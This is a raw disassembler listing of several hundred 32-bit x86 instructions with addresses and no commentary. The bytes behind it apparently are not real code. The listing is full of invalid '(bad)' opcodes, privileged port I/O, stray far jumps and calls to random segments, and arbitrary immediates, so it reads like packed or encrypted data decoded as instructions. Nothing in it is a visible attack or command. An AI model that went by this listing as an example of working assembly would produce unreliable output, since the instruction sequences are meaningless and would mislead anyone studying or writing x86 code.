  424f7e:	cmp    ah,cl
  424f80:	lds    ecx,FWORD PTR [esi+0x78]
  424f83:	push   ebp
  424f84:	pop    esi
  424f85:	jbe    0x424f8a
  424f87:	or     ebp,ebx
  424f89:	mov    dh,0xd5
  424f8b:	rcl    al,1
  424f8d:	push   esi
  424f8e:	mov    al,ds:0xc6f5bf02
  424f93:	fdivr  st,st(3)
  424f95:	mov    DWORD PTR [eax],ecx
  424f97:	mov    ebx,0x4c9873bb
  424f9c:	fdiv   QWORD PTR [eax-0x7e]
  424f9f:	sbb    BYTE PTR ds:0x6db67474,bh
  424fa5:	outs   dx,DWORD PTR ds:[esi]
  424fa6:	or     eax,0x3af32330
  424fab:	inc    esi
  424fac:	stos   DWORD PTR es:[edi],eax
  424fad:	add    BYTE PTR ss:[eax],0x2c
  424fb1:	mov    esp,0x8e976d37
  424fb6:	icebp  
  424fb7:	sub    ebp,0x7ffed2d8
  424fbd:	sub    DWORD PTR [ebx+0x9],esp
  424fc0:	mov    dh,0x9
  424fc2:	out    0x2,eax
  424fc4:	sbb    dh,BYTE PTR [edx]
  424fc6:	jmp    0x3a64:0x70c7c76
  424fcd:	cwde   
  424fce:	and    eax,0xed8b925d
  424fd3:	jg     0x424fdd
  424fd5:	cs xchg ebx,eax
  424fd7:	mov    cl,BYTE PTR ds:0x9c8e1f01
  424fdd:	or     esp,DWORD PTR [esi-0x57]
  424fe0:	jae    0x42501a
  424fe2:	popf   
  424fe3:	mov    ?,WORD PTR [edx+esi*1-0x69]
  424fe7:	js     0x425017
  424fe9:	sahf   
  424fea:	in     eax,dx
  424feb:	rcl    BYTE PTR [esi+0x1d24232],cl
  424ff1:	pop    ss
  424ff2:	xor    eax,0x4dbb5381
  424ff7:	add    eax,DWORD PTR [esi]
  424ff9:	fldcw  WORD PTR [ebp+0x44]
  424ffc:	or     BYTE PTR [ebp+0x3fa9d60b],ch
  425002:	pushf  
  425003:	cmp    eax,0x9addf111
  425008:	loop   0x425057
  42500a:	mov    DWORD PTR [edi+edx*8+0xa281d9b],edi
  425011:	mov    eax,0xf6d9fedf
  425016:	dec    eax
  425017:	pushf  
  425018:	jge    0x42508c
  42501a:	jmp    0xd1a5:0x2582ccc1
  425021:	cmp    ebx,DWORD PTR [edi-0x26]
  425024:	pop    es
  425025:	mov    ds:0x2854eb93,eax
  42502a:	test   BYTE PTR [edx-0x36],bl
  42502d:	(bad)  
  42502e:	fwait
  42502f:	mul    BYTE PTR [eax-0x4b2cc45b]
  425035:	sti    
  425036:	dec    eax
  425037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425038:	pop    edi
  425039:	pop    ds
  42503a:	call   0xc5f9:0x1170032b
  425041:	stc    
  425042:	cli    
  425043:	and    ebx,edx
  425045:	and    edi,DWORD PTR ds:[ecx-0x42d102e0]
  42504c:	jg     0x425063
  42504e:	and    esi,DWORD PTR [edi+0x21b8ab5f]
  425054:	pop    eax
  425055:	shl    BYTE PTR [ebx-0x4646b71c],cl
  42505b:	aam    0xff
  42505d:	in     al,0xa5
  42505f:	mov    esi,0x808a6ee5
  425064:	adc    al,BYTE PTR [ecx+edi*2]
  425067:	cwde   
  425068:	rcr    eax,cl
  42506a:	mov    ebp,0x4c8ef019
  42506f:	or     dl,BYTE PTR [edi+0x7f16b458]
  425075:	rol    edi,1
  425077:	pop    esi
  425078:	clc    
  425079:	dec    eax
  42507a:	mov    ebp,0x906c2514
  42507f:	test   al,0xdf
  425081:	lods   eax,DWORD PTR ds:[esi]
  425082:	sbb    esi,DWORD PTR ds:0x5f4752cc
  425088:	mov    ebx,0xc1eef769
  42508d:	ret    0xe4f7
  425090:	inc    esi
  425091:	scas   al,BYTE PTR es:[edi]
  425092:	inc    edx
  425093:	adc    al,0x3d
  425095:	in     al,dx
  425096:	scas   al,BYTE PTR es:[edi]
  425097:	xchg   cl,ah
  425099:	jbe    0x425034
  42509b:	call   0x7708:0x9884a141
  4250a2:	dec    ebx
  4250a3:	cmp    DWORD PTR [eax],edx
  4250a5:	adc    al,0xdb
  4250a7:	jno    0x42502b
  4250a9:	in     al,dx
  4250aa:	pushf  
  4250ab:	or     al,0x66
  4250ad:	lahf   
  4250ae:	sub    DWORD PTR [ecx],edx
  4250b0:	fist   WORD PTR [eax-0xa]
  4250b3:	mul    DWORD PTR [eax+0x23]
  4250b6:	in     al,dx
  4250b7:	sbb    DWORD PTR [esi+0x47],esp
  4250ba:	fwait
  4250bb:	test   al,0xcd
  4250bd:	jp     0x42505a
  4250bf:	sbb    ebp,DWORD PTR [esi-0x4666d095]
  4250c5:	dec    esp
  4250c6:	or     DWORD PTR [ecx],ecx
  4250c8:	mov    ds:0x96ff619e,eax
  4250cd:	xchg   ecx,eax
  4250ce:	imul   DWORD PTR [esi]
  4250d0:	mov    edi,0x4d80d748
  4250d5:	jns    0x42505a
  4250d7:	pop    edx
  4250d8:	inc    ecx
  4250d9:	daa    
  4250da:	or     eax,0xa4622692
  4250df:	aas    
  4250e0:	push   eax
  4250e1:	sbb    al,0x8a
  4250e3:	pop    esi
  4250e4:	nop
  4250e5:	loop   0x42511c
  4250e7:	jo     0x4250b8
  4250e9:	cdq    
  4250ea:	jae    0x42507d
  4250ec:	mov    DWORD PTR [esi+0x3c],ecx
  4250ef:	xor    dl,BYTE PTR [edx]
  4250f1:	cs shr cl,0xb
  4250f5:	lahf   
  4250f6:	adc    BYTE PTR [ecx+0x65],cl
  4250f9:	call   0xd72b54a3
  4250fe:	ret    0x6a04
  425101:	into   
  425102:	xor    ebp,DWORD PTR [edx+esi*8]
  425105:	(bad)  
  425106:	repnz loopne 0x4250ca
  425109:	adc    ecx,DWORD PTR [edi+0x344f0ed9]
  42510f:	mov    cl,0xf3
  425111:	push   ds
  425112:	mov    eax,ds:0xa5cef480
  425117:	pop    ds
  425118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425119:	or     DWORD PTR [esi+0x19],eax
  42511c:	mov    DWORD PTR [esi-0x3a],0xf56da2c6
  425123:	mov    ds:0x2a394cdb,al
  425128:	xchg   ecx,eax
  425129:	push   ecx
  42512a:	jno    0x4250c6
  42512c:	(bad)  
  42512d:	jmp    0x6415:0x301a74f2
  425134:	mov    esi,0x14063b6f
  425139:	shr    BYTE PTR [ecx],0xa1
  42513c:	jecxz  0x42517a
  42513e:	imul   esi,DWORD PTR [ebx+0x1a53b2ff],0x4f286ac8
  425148:	push   ecx
  425149:	and    al,0x43
  42514b:	ins    BYTE PTR es:[edi],dx
  42514c:	sub    eax,0x9c7688bd
  425151:	pushf  
  425152:	ja     0x425152
  425154:	stos   DWORD PTR es:[edi],eax
  425155:	xor    ch,BYTE PTR [ebp+0x3fabf08]
  42515b:	lods   eax,DWORD PTR ds:[esi]
  42515c:	sbb    bh,bl
  42515e:	std    
  42515f:	les    ebx,FWORD PTR [eax]
  425161:	dec    eax
  425162:	das    
  425163:	mov    cl,0x7d
  425165:	fcomip st,st(2)
  425167:	jecxz  0x425128
  425169:	adc    edx,DWORD PTR [eax]
  42516b:	sbb    al,0x6d
  42516d:	gs push ss
  42516f:	cdq    
  425170:	sub    eax,0x9d718291
  425175:	mov    ebx,DWORD PTR [ebx]
  425177:	push   esp
  425178:	xchg   esi,eax
  425179:	(bad)  
  42517a:	xchg   esi,eax
  42517b:	xor    al,0x50
  42517d:	sbb    al,0xc5
  42517f:	push   cs
  425180:	(bad)  
  425181:	arpl   WORD PTR [eax+ecx*1+0x648e5b30],di
  425188:	inc    edi
  425189:	mov    BYTE PTR [ebx-0x44],0xe2
  42518d:	fmul   DWORD PTR [edi]
  42518f:	jmp    0x14b9:0x8e57df61
  425196:	mov    bl,0x86
  425198:	push   0xa14a8ef7
  42519d:	(bad)  
  42519f:	xor    al,0x71
  4251a1:	xor    BYTE PTR ds:0xa0ec4604,bh
  4251a7:	gs mov ah,0x1e
  4251aa:	pop    ss
  4251ab:	cli    
  4251ac:	or     eax,0x9082e875
  4251b1:	pop    eax
  4251b2:	mov    eax,0xcc6de148
  4251b7:	dec    ecx
  4251b8:	(bad)  
  4251b9:	icebp  
  4251ba:	add    al,0xd2
  4251bc:	inc    ebx
  4251bd:	retf   
  4251be:	jge    0x42519f
  4251c0:	jne    0x42521c
  4251c2:	popf   
  4251c3:	xchg   BYTE PTR [ebp+0x32],al
  4251c6:	scas   al,BYTE PTR es:[edi]
  4251c7:	push   es
  4251c8:	or     al,0xc0
  4251ca:	lock mov ds:0xfbda30c5,al
  4251d0:	xlat   BYTE PTR ds:[ebx]
  4251d1:	mov    bh,0x47
  4251d3:	in     al,dx
  4251d4:	repnz push cs
  4251d6:	push   ds
  4251d7:	lds    ebp,FWORD PTR [esi]
  4251d9:	jns    0x425201
  4251db:	in     eax,dx
  4251dc:	add    edi,DWORD PTR [ebx]
  4251de:	jae    0x4251c5
  4251e0:	sbb    DWORD PTR [esi-0x2bfb158b],ecx
  4251e6:	mov    ebx,0xaaf14079
  4251eb:	pop    es
  4251ec:	imul   esp,DWORD PTR [ebx+esi*8+0x54],0xad284d1e
  4251f4:	xchg   ebp,eax
  4251f5:	mul    BYTE PTR [ecx-0x1d]
  4251f8:	push   ss
  4251f9:	das    
  4251fa:	in     al,0x81
  4251fc:	mov    dl,0xf0
  4251fe:	arpl   WORD PTR [edi-0x1f],ax
  425201:	or     bh,dh
  425203:	and    eax,0x8b4d814c
  425208:	pop    esi
  425209:	retf   
  42520a:	ret    0x7c6c
  42520d:	push   ss
  42520e:	sbb    BYTE PTR [esi],bl
  425210:	out    dx,eax
  425211:	stos   DWORD PTR es:[edi],eax
  425212:	and    ecx,DWORD PTR [edi+ebx*1]
  425215:	jg     0x42522e
  425217:	sub    eax,DWORD PTR [ecx]
  425219:	scas   eax,DWORD PTR es:[edi]
  42521a:	aas    
  42521b:	hlt    
  42521c:	shl    ebx,0xbd
  42521f:	icebp  
  425220:	stc    
  425221:	xor    BYTE PTR [edi+eax*1-0x2a5fc921],dl
  425228:	retf   
  425229:	clc    
  42522a:	call   0x4cc5:0xe2ecc836
  425231:	es data16 cli 
  425234:	daa    
  425235:	ret    0xdc92
  425238:	jae    0x42525a
  42523a:	mov    dl,0x5
  42523c:	and    al,0x81
  42523e:	and    ch,0x69
  425241:	or     eax,0xec64fe79
  425246:	push   es
  425247:	xor    BYTE PTR [edx+0x2ed9792b],bh
  42524d:	mov    eax,0xd76994ba
  425252:	inc    eax
  425253:	(bad)  
  425254:	jmp    0xbbc4:0xbf259022
  42525b:	mov    ecx,0x375edf6e
  425260:	jp     0x425243
  425262:	add    ecx,DWORD PTR [edi]
  425264:	jne    0x4251e8
  425266:	jle    0x425287
  425268:	mov    esi,0xa594cf35
  42526d:	sbb    DWORD PTR [ecx-0xb],eax
  425270:	les    ecx,FWORD PTR [esi-0x17]
  425273:	mov    al,0xb5
  425275:	mov    esp,0xc0a17b3c
  42527a:	jno    0x42520b
  42527c:	mov    bh,0xfa
  42527e:	leave  
  42527f:	inc    esp
  425280:	daa    
  425281:	sub    DWORD PTR [edi],ecx
  425283:	jae    0x4252b7
  425285:	add    DWORD PTR [esi],0xfffffffe
  425288:	pushf  
  425289:	cwde   
  42528a:	lods   eax,DWORD PTR ds:[esi]
  42528b:	out    dx,eax
  42528c:	loope  0x425252
  42528e:	es aam 0xe5
  425291:	sbb    DWORD PTR [ebp-0x10],ebx
  425294:	mov    DWORD PTR ss:[edi+ebp*8+0x5b98dadc],esp
  42529c:	test   eax,0x6e0b7d00
  4252a1:	iret   
  4252a2:	sub    DWORD PTR [ecx+edx*8],eax
  4252a5:	sbb    ah,0xab
  4252a8:	outs   dx,DWORD PTR ds:[esi]
  4252a9:	inc    edx
  4252aa:	cmp    DWORD PTR [edi],esp
  4252ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252ad:	xchg   DWORD PTR [eax-0xc],esp
  4252b0:	mov    eax,0xaf9414a5
  4252b5:	popa   
  4252b6:	and    BYTE PTR [esi-0x47],cl
  4252b9:	icebp  
  4252ba:	cmp    esp,DWORD PTR ds:0x33d359bb
  4252c0:	xor    eax,0x3b8896c3
  4252c5:	mov    ah,0xe2
  4252c7:	in     al,dx
  4252c8:	(bad)  [ecx+eax*1]
  4252cb:	ds fwait
  4252cd:	into   
  4252ce:	jmp    DWORD PTR [ecx]
  4252d0:	push   esi
  4252d1:	dec    edx
  4252d2:	test   al,0x68
  4252d4:	shr    DWORD PTR [esp+eiz*2],cl
  4252d7:	sbb    dh,BYTE PTR [ebx]
  4252d9:	(bad)  
  4252da:	xor    eax,0xcd9e1db
  4252df:	stos   DWORD PTR es:[edi],eax
  4252e0:	adc    esp,DWORD PTR [eax+0x4886f263]
  4252e6:	in     al,0x1
  4252e8:	dec    edx
  4252e9:	je     0x4252e0
  4252eb:	ficom  DWORD PTR [ebp+eiz*1+0xc]
  4252ef:	cli    
  4252f0:	and    BYTE PTR [edi-0x4b],al
  4252f3:	mov    ch,0xf
  4252f5:	jne    0x425353
  4252f7:	sar    DWORD PTR [ebx],0xf
  4252fa:	mov    cl,0x5f
  4252fc:	pop    eax
  4252fd:	outs   dx,BYTE PTR ds:[esi]
  4252fe:	mov    edx,DWORD PTR [ebp+0x4b]
  425301:	dec    ebx
  425302:	div    DWORD PTR [esi-0x6e0152ec]
  425308:	jge    0x4252e0
  42530a:	ja     0x4252e4
  42530c:	nop
  42530d:	sbb    al,0x58
  42530f:	ret    
  425310:	je     0x42529b
  425312:	js     0x42536a
  425314:	lea    esp,[edi+ebx*8]
  425317:	add    DWORD PTR [esi+0x1d39e46d],0x48
  42531e:	test   eax,0xf0f81055
  425323:	(bad)  
  425325:	inc    esi
  425326:	xchg   cl,al
  425328:	iret   
  425329:	loop   0x4252c7
  42532b:	and    eax,0x4f6e297c
  425330:	icebp  
  425331:	or     eax,DWORD PTR [edi+0x45]
  425334:	jnp    0x425339
  425336:	add    ah,BYTE PTR [ecx-0x1ec0d507]
  42533c:	adc    eax,DWORD PTR fs:[ebp+0x7d33f7b5]
  425343:	add    dh,0xa8
  425346:	fwait
  425347:	pop    ds
  425348:	fidiv  WORD PTR [ebx-0x6a]
  42534b:	xchg   DWORD PTR es:[edi+0x51],edi
  42534f:	outs   dx,DWORD PTR ds:[esi]
  425350:	mov    ebx,0x12ec9534
  425355:	(bad)
  425358:	pop    esi
  425359:	mov    dl,0x36
  42535b:	shl    BYTE PTR [edi],1
  42535d:	arpl   WORD PTR [edx-0x41478974],bp
  425363:	push   esp
  425364:	mov    DWORD PTR [ebp-0x3c],0x3694868f
  42536b:	sar    bl,cl
  42536d:	jns    0x4253e5
  42536f:	loop   0x425340
  425371:	repnz stc 
  425373:	xor    BYTE PTR [eax-0x6f],0xd8
  425377:	and    eax,0x37e89406
  42537c:	mov    bh,0x6
  42537e:	ds xor eax,0xa3621cca
  425384:	xor    al,0x29
  425386:	lea    esi,[eax+0x18]
  425389:	sub    cl,BYTE PTR [edx+0x71802646]
  42538f:	mov    esp,0xb21384af
  425394:	push   ss
  425395:	out    dx,eax
  425396:	sub    eax,0xa311c1eb
  42539b:	stc    
  42539c:	pop    edx
  42539d:	call   0x397a3394
  4253a2:	cwde   
  4253a3:	mov    ebx,0x293bd1e5
  4253a8:	or     eax,0x58713853
  4253ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253ae:	lahf   
  4253af:	(bad)  
  4253b0:	jl     0x42536e
  4253b2:	xor    ebx,DWORD PTR [edx+ebx*8+0x4e]
  4253b6:	adc    al,0x86
  4253b8:	inc    esp
  4253b9:	cmp    al,0x68
  4253bb:	scas   eax,DWORD PTR es:[edi]
  4253bc:	stc    
  4253bd:	jmp    0x9e1ad371
  4253c2:	jmp    0x395352e3
  4253c7:	and    eax,0xb057ee05
  4253cc:	scas   al,BYTE PTR es:[edi]
  4253cd:	gs xchg ecx,eax
  4253cf:	add    edx,DWORD PTR [edx-0x252b52fb]
  4253d5:	adc    BYTE PTR [ebx-0x1b0b4cf2],0xff
  4253dc:	inc    esp
  4253dd:	rol    BYTE PTR [bx+si+0x38c9],cl
  4253e2:	mov    eax,ds:0xdc8292cc
  4253e7:	adc    DWORD PTR [edx],edi
  4253e9:	in     eax,dx
  4253ea:	nop
  4253eb:	xor    al,0x96
  4253ed:	retf   0x5fe4
  4253f0:	jg     0x42546b
  4253f2:	fmulp  st(0),st
  4253f4:	jne    0x4253d1
  4253f6:	out    0x20,eax
  4253f8:	(bad)  
  4253f9:	dec    ebx
  4253fa:	ret    
  4253fb:	mov    ebp,DWORD PTR [ecx-0x3180a45b]
  425401:	jmp    0x4253de
  425403:	mov    cl,0x94
  425405:	inc    eax
  425406:	sbb    BYTE PTR [ebx],0x74
  425409:	mov    edx,DWORD PTR [esi+0x57]
  42540c:	(bad)  
  42540d:	sub    ecx,DWORD PTR [edx-0x39218248]
  425413:	js     0x425494
  425415:	push   ebx
  425416:	adc    al,0x9
  425418:	repz pusha 
  42541a:	jg     0x425472
  42541c:	cmp    BYTE PTR [edi+0x1c],ch
  42541f:	loop   0x42544b
  425421:	xor    eax,0x788933c6
  425426:	lock mov edx,0x84efa28d
  42542c:	sti    
  42542d:	fbld   TBYTE PTR [ebx-0x46]
  425430:	mov    ebx,0x1e3fba24
  425435:	aaa    
  425436:	sub    BYTE PTR [ebx-0x6f023cbb],ch
  42543c:	hlt    
  42543d:	sub    cl,BYTE PTR [ecx]
  42543f:	fs add al,bl
  425442:	test   al,0x54
  425444:	aad    0x74
  425446:	enter  0xf874,0x51
  42544a:	xchg   esi,eax
  42544b:	xchg   edi,eax
  42544c:	mov    al,ds:0x44bc26db
  425451:	lods   al,BYTE PTR ds:[esi]
  425452:	inc    edx
  425453:	daa    
  425454:	push   ds
  425455:	(bad)  
  425456:	aaa    
  425457:	adc    BYTE PTR [eax+0x45],ah
  42545a:	pop    ds
  42545b:	in     eax,dx
  42545c:	xchg   edx,eax
  42545d:	data16 hlt 
  42545f:	push   eax
  425460:	mov    ch,dl
  425462:	(bad)  
  425463:	cld    
  425464:	sub    DWORD PTR [esi-0x32],ecx
  425467:	popf   
  425468:	scas   eax,DWORD PTR es:[edi]
  425469:	or     DWORD PTR [eax+0x744b7299],edx
  42546f:	cdq    
  425470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425471:	jl     0x425487
  425473:	aas    
  425474:	lods   eax,DWORD PTR ds:[esi]
  425475:	daa    
  425476:	mov    bl,BYTE PTR [edx]
  425478:	popa   
  425479:	sub    eax,0x67b1d1fa
  42547e:	jo     0x425408
  425480:	push   edi
  425481:	inc    ebx
  425482:	dec    eax
  425483:	hlt    
  425484:	sar    DWORD PTR [esi+ebx*2+0x633b32e3],1
  42548b:	lock xchg BYTE PTR [ebp-0x4f05f795],bl
  425492:	fwait
  425493:	adc    eax,0xb3f2454d
  425498:	inc    ebp
  425499:	scas   eax,DWORD PTR es:[edi]
  42549a:	mov    BYTE PTR [ebx-0x131a9906],bh
  4254a0:	sub    ah,BYTE PTR [ebx+0x6f62736f]
  4254a6:	shr    BYTE PTR [ebp+0x3bb6df],1
  4254ac:	cli    
  4254ad:	loope  0x425468
  4254af:	daa    
  4254b0:	xchg   ecx,eax
  4254b1:	mov    eax,ds:0xc54751db
  4254b6:	dec    ecx
  4254b7:	dec    ecx
  4254b8:	test   DWORD PTR [edi+0x6e6d2e2a],eax
  4254be:	into   
  4254bf:	lds    ebp,FWORD PTR [ecx]
  4254c1:	clc    
  4254c2:	mov    ?,WORD PTR [ebx]
  4254c4:	push   eax
  4254c5:	xor    edx,DWORD PTR [edx]
  4254c7:	imul   ebx,DWORD PTR [eax-0x48],0x3db5e087
  4254ce:	sbb    DWORD PTR [edi+0x19],0x3c10997a
  4254d5:	mov    al,ds:0xb9dd199e
  4254da:	daa    
  4254db:	stos   BYTE PTR es:[edi],al
  4254dc:	push   ss
  4254dd:	int    0x83
  4254df:	cmc    
  4254e0:	test   eax,0x93fb3f87
  4254e5:	push   ss
  4254e6:	xchg   ecx,eax
  4254e7:	dec    esp
  4254e8:	cmp    DWORD PTR [ebx+ecx*2-0x2056f2ea],esp
  4254ef:	imul   DWORD PTR [esi+0xd2db6af]
  4254f5:	adc    ebx,eax
  4254f7:	jp     0x42553f
  4254f9:	xchg   edx,eax
  4254fa:	xor    bh,BYTE PTR [esi-0x9]
  4254fd:	into   
  4254fe:	adc    DWORD PTR [edx],esp
  425500:	add    ebp,0xffffffbb
  425503:	mov    ah,BYTE PTR ds:0xb54933f
  425509:	loope  0x4254c2
  42550b:	sbb    ah,dh
  42550d:	xchg   ecx,esp
  42550f:	cwde   
  425510:	aas    
  425511:	mov    al,ds:0x1f615867
  425516:	or     eax,0x4c719652
  42551b:	stos   BYTE PTR es:[edi],al
  42551c:	mov    ah,bl
  42551e:	or     ah,BYTE PTR [esi-0x3]
  425521:	mov    edx,0x9ce672d9
  425526:	lock or eax,0x4808f7df
  42552c:	imul   DWORD PTR ds:0x56bb2562
  425532:	push   cs
  425533:	push   ebp
  425534:	mov    ebx,0x14949ef5
  425539:	push   ebx
  42553a:	xor    eax,0x6362375b
  42553f:	in     eax,0x4e
  425541:	arpl   cx,bx
  425543:	sbb    esi,ebp
  425545:	stc    
  425546:	rcr    DWORD PTR [esi-0x5ca5f1a4],cl
  42554c:	outs   dx,BYTE PTR ds:[esi]
  42554d:	jl     0x4255b3
  42554f:	pusha  
  425550:	jns    0x42553c
  425552:	mov    WORD PTR [edi-0x52],gs
  425555:	pop    ss
  425556:	pop    esp
  425557:	jae    0x4254e4
  425559:	inc    edi
  42555a:	test   eax,0x34b4bb85
  42555f:	inc    eax
  425560:	sub    BYTE PTR [esi-0x60],al
  425563:	das    
  425564:	int3   
  425565:	loope  0x42556d
  425567:	xchg   edi,eax
  425568:	ja     0x4254fe
  42556a:	outs   dx,BYTE PTR ds:[esi]
  42556b:	test   al,0xb9
  42556d:	inc    ebx
  42556e:	add    eax,0x1c667916
  425573:	cmp    dh,ch
  425575:	retf   
  425576:	test   DWORD PTR [ebp-0x4f637291],edx
  42557c:	mov    es,WORD PTR [ebx+ecx*4-0x75d2e37a]
  425583:	mov    edx,0x988287d8
  425588:	cmc    
  425589:	xchg   esi,eax
  42558a:	stos   DWORD PTR es:[edi],eax
  42558b:	(bad)  
  42558c:	std    
  42558d:	out    dx,eax
  42558e:	cld    
  42558f:	jge    0x4255e0
  425591:	and    eax,0xa06f77b1
  425596:	nop
  425597:	loope  0x425613
  425599:	and    bl,BYTE PTR ss:[ecx+esi*8-0x1fc712dc]
  4255a1:	pop    edi
  4255a2:	mov    eax,ds:0x9459333f
  4255a7:	shr    ebp,1
  4255a9:	pop    es
  4255aa:	arpl   WORD PTR [edx],si
  4255ac:	ss or  al,0x24
  4255af:	int3   
  4255b0:	arpl   WORD PTR [ecx],sp
  4255b2:	sahf   
  4255b3:	xlat   BYTE PTR ds:[ebx]
  4255b4:	pop    ebx
  4255b5:	pop    eax
  4255b6:	mov    ch,0x91
  4255b8:	ja     0x425575
  4255ba:	mov    ebp,0x181690b6
  4255bf:	loopne 0x425591
  4255c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255c2:	and    al,0x55
  4255c4:	mov    dl,0xe8
  4255c6:	fidivr DWORD PTR [eax]
  4255c8:	or     DWORD PTR [ebp-0x1d],eax
  4255cb:	dec    ecx
  4255cc:	or     DWORD PTR [edx-0x44],edx
  4255cf:	mov    WORD PTR [ebp-0x42b7f0ec],gs
  4255d5:	cmp    esi,esp
  4255d7:	icebp  
  4255d8:	push   edi
  4255d9:	imul   esp,DWORD PTR [eax],0x42
  4255dc:	xchg   edi,eax
  4255dd:	sub    al,0x5f
  4255df:	sub    eax,DWORD PTR [edi-0x62]
  4255e2:	add    cl,0x67
  4255e5:	lahf   
  4255e6:	add    eax,0xd3142fb7
  4255eb:	pop    esp
  4255ec:	mov    ds:0x6e4fcf73,al
  4255f1:	xor    eax,0x486cf0b4
  4255f6:	daa    
  4255f7:	mov    al,BYTE PTR [esi+0xab4dd0d]
  4255fd:	(bad)  
  4255ff:	or     al,0x58
  425601:	ins    DWORD PTR es:[edi],dx
  425602:	hlt    
  425603:	mov    dh,0x72
  425605:	cdq    
  425606:	daa    
  425607:	(bad)  [edx+0xc8b8fe8]
  42560d:	retf   0xe949
  425610:	add    BYTE PTR [edx-0x27],bl
  425613:	add    eax,0x22ed830b
  425618:	jle    0x4255dd
  42561a:	fdiv   QWORD PTR es:[eax+0x2d]
  42561e:	xchg   esi,eax
  42561f:	push   eax
  425620:	jl     0x425673
  425622:	mov    ah,0x2b
  425624:	fs loop 0x4255e8
  425627:	stos   BYTE PTR es:[edi],al
  425628:	dec    edi
  425629:	jl     0x42562c
  42562b:	xor    edx,DWORD PTR [edi-0x643468e0]
  425631:	push   ebp
  425632:	jae    0x425639
  425634:	les    ebp,FWORD PTR [edi+0xb]
  425637:	jmp    0xc71e4e56
  42563c:	pop    ecx
  42563d:	add    BYTE PTR [ebx-0x58],al
  425640:	test   BYTE PTR [edx],dl
  425642:	icebp  
  425643:	retf   
  425644:	xlat   BYTE PTR ds:[ebx]
  425645:	or     dl,BYTE PTR [edi-0x3]
  425648:	push   ebp
  425649:	rol    BYTE PTR [edx-0x3f3c9434],1
  42564f:	sbb    eax,0x689904bd
  425654:	outs   dx,DWORD PTR ds:[esi]
  425655:	sbb    al,ch
  425657:	mov    ah,0x4f
  425659:	or     BYTE PTR [eax],dh
  42565b:	sub    dl,BYTE PTR fs:[edx-0x40a81572]
  425662:	loope  0x425633
  425664:	jno    0x425658
  425666:	out    dx,eax
  425667:	lock arpl WORD PTR [ecx+ebp*4],sp
  42566b:	or     eax,0x63a96f01
  425670:	mov    esi,0x9b4167d0
  425675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425676:	ds ret 0x827e
  42567a:	xor    dh,BYTE PTR [ecx-0x1a]
  42567d:	imul   eax,esi,0x830f2c01
  425683:	or     BYTE PTR [ebp+0x75d84cc5],ch
  425689:	mov    dh,0x4f
  42568b:	in     al,dx
  42568c:	cli    
  42568d:	inc    edx
  42568e:	xchg   ebx,eax
  42568f:	dec    edi
  425690:	adc    al,0x6
  425692:	dec    eax
  425693:	pop    ds
  425694:	imul   ebp,DWORD PTR [edx],0x61
  425697:	mul    edx
  425699:	dec    eax
  42569a:	mov    ds:0xe31559e9,al
  42569f:	and    esp,DWORD PTR [edx-0x475ad267]
  4256a5:	(bad)  
  4256a6:	in     al,0xda
  4256a8:	push   ebx
  4256a9:	loop   0x4256ef
  4256ab:	lea    edi,[edx-0x409ed3b2]
  4256b1:	outs   dx,BYTE PTR ds:[esi]
  4256b2:	push   ds
  4256b3:	inc    ecx
  4256b4:	xchg   DWORD PTR [edx-0x41],esp
  4256b7:	je     0x42566a
  4256b9:	xchg   cl,al
  4256bb:	iret   
  4256bc:	xlat   BYTE PTR ds:[ebx]
  4256bd:	xlat   BYTE PTR ds:[ebx]
  4256be:	and    al,0x52
  4256c0:	sub    DWORD PTR [ecx],0x6e
  4256c3:	fcomip st,st(3)
  4256c5:	pop    esi
  4256c6:	mov    edx,0x800ddbb9
  4256cb:	jle    0x425680
  4256cd:	pop    edx
  4256ce:	mov    ecx,0x7d0177e8
  4256d3:	leave  
  4256d4:	inc    esi
  4256d5:	enter  0xc82a,0x37
  4256d9:	mov    eax,ds:0x2542f870
  4256de:	push   0x43aa0914
  4256e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e4:	mov    bl,0xd5
  4256e6:	out    dx,al
  4256e7:	pop    eax
  4256e8:	(bad)  
  4256e9:	out    dx,eax
  4256ea:	popa   
  4256eb:	enter  0xd26f,0xc5
  4256ef:	shl    BYTE PTR ds:0x5d7ded7e,1
  4256f5:	inc    esi
  4256f6:	dec    esp
  4256f7:	xor    BYTE PTR [eax+eax*8-0x2ea22933],al
  4256fe:	pop    es
  4256ff:	sub    eax,0x7edf2067
  425704:	add    ecx,esi
  425706:	ret    
  425707:	in     eax,dx
  425708:	lods   eax,DWORD PTR ds:[esi]
  425709:	les    ecx,FWORD PTR [edx-0x5b]
  42570c:	pop    esp
  42570d:	in     eax,dx
  42570e:	adc    al,BYTE PTR [edi+0xe]
  425711:	xor    eax,0x76ce4140
  425716:	repz int 0xff
  425719:	push   edx
  42571a:	(bad)  
  42571b:	sti    
  42571c:	gs sub al,0x7e
  42571f:	pop    eax
  425720:	pop    ss
  425721:	mov    ah,BYTE PTR [ebx+0x9]
  425724:	add    eax,0x6253e74a
  425729:	and    dh,BYTE PTR [ebp-0x56845478]
  42572f:	and    DWORD PTR [edi-0x47],eax
  425732:	pushf  
  425733:	xlat   BYTE PTR ds:[ebx]
  425734:	dec    ebp
  425735:	cli    
  425736:	push   eax
  425737:	int3   
  425738:	sbb    ecx,DWORD PTR [ecx-0x4e2591b9]
  42573e:	adc    BYTE PTR [eax+0x48],ch
  425741:	push   DWORD PTR [esi+0x64aa6235]
  425747:	push   es
  425748:	sti    
  425749:	or     edx,DWORD PTR [esi-0x2b5f50e2]
  42574f:	pop    ebx
  425750:	xchg   ebp,eax
  425751:	pusha  
  425752:	fst    QWORD PTR [ebp+0x1a2ec5c4]
  425758:	push   edx
  425759:	loopne 0x42579e
  42575b:	xor    edi,edx
  42575d:	mov    dh,0x21
  42575f:	jns    0x42573e
  425761:	lock ins BYTE PTR es:[edi],dx
  425763:	(bad)  
  425764:	fdivp  st(6),st
  425766:	inc    edi
  425767:	xchg   ebx,eax
  425768:	push   eax
  425769:	pop    es
  42576a:	push   cs
  42576b:	(bad)  
  42576c:	fadd   st,st(0)
  42576e:	xchg   ebp,eax
  42576f:	sub    DWORD PTR [eax-0x36],0x1d508cc9
  425776:	in     eax,0xef
